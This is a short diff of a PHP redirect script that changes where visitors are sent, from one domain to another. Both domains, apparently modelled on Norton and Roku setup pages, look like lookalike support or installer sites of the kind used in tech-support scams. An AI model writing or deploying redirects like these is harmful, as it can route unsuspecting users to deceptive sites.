@@ -1,4 +1,4 @@
 <?php
-header("Location: https://install-setups.website/norto/");
+header("Location: https://rokucomlink.website/");
 die();
 ?>
